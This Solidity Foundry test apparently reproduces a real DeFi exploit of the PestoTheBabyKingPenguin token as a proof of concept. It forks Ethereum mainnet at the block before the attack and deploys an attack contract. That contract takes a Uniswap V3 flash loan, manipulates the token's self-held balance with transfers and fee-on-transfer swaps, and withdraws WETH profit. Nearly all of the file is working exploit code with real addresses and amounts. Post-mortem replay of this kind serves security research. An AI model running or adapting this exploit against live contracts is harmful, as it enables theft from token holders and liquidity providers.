pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.4K USD
// Attacker : 0x7248939f65bdd23aab9eaab1bc4a4f909567486e
// Attack Contract : https://etherscan.io/address/0xbdb0bc0941ba81672593cd8b3f9281789f2754d1
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x3d5b4a0d560e8dd750239b578e2b85921b523835b644714dc239a2db70cf067c

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1838225968009527652
// Twitter Guy : https://x.com/TenArmorAlert/status/1838225968009527652
// Hacking God : N/A

address constant UniswapV3Pool = 0x03D93835F5cE4dD7F0EAAb019b33050939c722b1;
address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant PestoTheBabyKingPenguin = 0xE81C4A73bfDdb1dDADF7d64734061bE58d4c0b4C;
address constant attacker = 0x7248939f65bdd23Aab9eaaB1bc4A4F909567486e;
address constant addr1 = 0xBdb0bc0941BA81672593Cd8B3F9281789F2754D1;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20811949 - 1);
        deal(attacker, 4.59e-16 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack{value: 4.59e-16 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xBdb0bc0941BA81672593Cd8B3F9281789F2754D1
contract AttackerC {
    receive() external payable {}

    function attack() public payable {
        address t0 = IUniswapV3Pool(UniswapV3Pool).token0();
        if (t0 != PestoTheBabyKingPenguin) {
            bytes memory data = abi.encodePacked(
                bytes20(PestoTheBabyKingPenguin),
                uint256(4200000000000000001),
                bytes20(UniswapV3Pool),
                uint8(1),
                uint256(0),
                uint256(18906536720334536200)
            );
            IUniswapV3Pool(UniswapV3Pool).flash(address(this), 0, 18906536720334536200, data);

            uint256 bal = IWETH9(weth9).balanceOf(address(this));
            if (bal > 0) {
                IWETH9(weth9).withdraw(bal);
                payable(tx.origin).call{value: 503881906767766532}("");
            }
        }
    }

    function uniswapV3FlashCallback(uint256 /*fee0*/, uint256 /*fee1*/, bytes calldata) external {
        uint256 selfPesto = IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).balanceOf(address(this));
        uint256 tokenSupplyAddr = IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).balanceOf(PestoTheBabyKingPenguin);

        if (tokenSupplyAddr < 4200000000000000001) {
            if (selfPesto > (4200000000000000001 - tokenSupplyAddr) && selfPesto >= 4200000000000000001) {
                uint256 amtIn = selfPesto + tokenSupplyAddr - 8400000000000000002;
                IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).approve(UniswapV2Router02, amtIn);
                IUniswapV2Router02(UniswapV2Router02)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        amtIn,
                        0,
                        _path(PestoTheBabyKingPenguin, weth9),
                        address(this),
                        block.timestamp + 1
                    );

                uint256 tokenSupplyAddr2 = IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).balanceOf(PestoTheBabyKingPenguin);
                if (tokenSupplyAddr2 < 4200000000000000001) {
                    uint256 diffPlus1 = 4200000000000000002 - tokenSupplyAddr2;
                    IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).transfer(PestoTheBabyKingPenguin, diffPlus1);

                    uint256 remainPesto = IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).balanceOf(address(this));
                    IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).approve(UniswapV2Router02, remainPesto);
                    IUniswapV2Router02(UniswapV2Router02)
                        .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                            remainPesto,
                            0,
                            _path(PestoTheBabyKingPenguin, weth9),
                            address(this),
                            block.timestamp + 1
                        );

                    uint256 wethBal = IWETH9(weth9).balanceOf(address(this));
                    IWETH9(weth9).approve(UniswapV2Router02, wethBal);
                    uint256[] memory spent = IUniswapV2Router02(UniswapV2Router02).swapTokensForExactTokens(
                        19095602087537881562,
                        wethBal,
                        _path(weth9, PestoTheBabyKingPenguin),
                        address(this),
                        block.timestamp + 1
                    );
                    spent; // silence unused variable
                    uint256 pestoBalNow = IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).balanceOf(address(this));
                    if (pestoBalNow >= 19095602087537881562) {
                        IPestoTheBabyKingPenguin(PestoTheBabyKingPenguin).transfer(UniswapV3Pool, 19095602087537881562);
                    }
                }
            }
        }
    }

    function _path(address a, address b) internal pure returns (address[] memory p) {
        p = new address[](2);
        p[0] = a;
        p[1] = b;
    }

    fallback() external payable {}
}

interface IUniswapV3Pool {
	function token0() external view returns (address);
	function flash(address, uint256, uint256, bytes calldata) external; 
}
interface IWETH9 {
	function balanceOf(address) external view returns (uint256);
	function withdraw(uint256) external;
	function approve(address, uint256) external returns (bool); 
}
interface IUniswapV2Router02 {
	function swapTokensForExactTokens(uint256, uint256, address[] calldata, address, uint256) external returns (uint256[] memory);
	function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external; 
}
interface IPestoTheBabyKingPenguin is IERC20 {
	function transfer(address, uint256) external returns (bool);
	function balanceOf(address) external view returns (uint256);
	function approve(address, uint256) external returns (bool); 
}